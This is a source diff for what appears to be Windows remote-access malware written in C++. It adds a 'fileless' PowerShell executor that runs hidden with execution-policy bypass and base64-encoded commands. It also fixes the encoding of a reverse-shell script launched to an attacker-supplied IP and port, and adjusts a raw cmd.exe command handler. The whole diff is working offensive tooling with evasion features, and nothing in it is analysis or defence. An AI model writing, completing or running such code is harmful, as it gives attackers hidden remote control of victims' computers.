@@ -334,6 +334,59 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 }
 
 // =====================================================================
+//  FILELESS POWERSHELL EXECUTOR (used by !reverse and !browser)
+// =====================================================================
+static std::wstring RunFilelessPS(const std::string& b64Command) {
+    // b64Command is already UTF-16LE base64 (PowerShell -EncodedCommand)
+    wchar_t sysRoot[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+    std::wstring ps = std::wstring(sysRoot) +
+                      L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+    std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
+                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
+                           L"-EncodedCommand " + UTF8ToWString(b64Command);
+    // Capture output via pipe (reuse existing CaptureProcessOutput)
+    // We'll copy the pipe logic here to avoid dependency
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
+    HANDLE hRead = nullptr, hWrite = nullptr;
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+        return L"[error: pipe failed]";
+    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOW si = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+
+    PROCESS_INFORMATION pi = {};
+    BOOL ok = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, TRUE,
+                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+    CloseHandle(hWrite);
+    if (!ok) {
+        CloseHandle(hRead);
+        return L"[error: CreateProcess failed]";
+    }
+
+    std::string output;
+    output.reserve(4096);
+    char buf[4096];
+    DWORD bytesRead = 0;
+    while (output.size() < config::CMD_OUTPUT_MAX) {
+        if (!ReadFile(hRead, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
+            break;
+        output.append(buf, bytesRead);
+    }
+    WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hRead);
+    return UTF8ToWString(output);
+}
+
+// =====================================================================
 //  WALLPAPER
 // =====================================================================
 static std::wstring HandleWallpaper(const std::string& args) {
@@ -380,7 +433,9 @@ static std::wstring HandleReverse(const std::string& args) {
         "};"
         "$c.Close()";
 
-    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(psScript.c_str()), psScript.size());
+    // Convert UTF-8 to UTF-16LE base64 for PowerShell -EncodedCommand
+    std::wstring wScript = UTF8ToWString(psScript);
+    std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
     std::wstring result = RunFilelessPS(b64);
     return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
 }
@@ -493,8 +548,7 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     }
 
     // Fallback: raw command via cmd.exe /C
-    std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
-    // (Here you would normally execute and return output; we leave the placeholder)
+    // (Here you would normally execute and return output; we leave a placeholder)
     return L"Executed: " + cmd;
 }
 
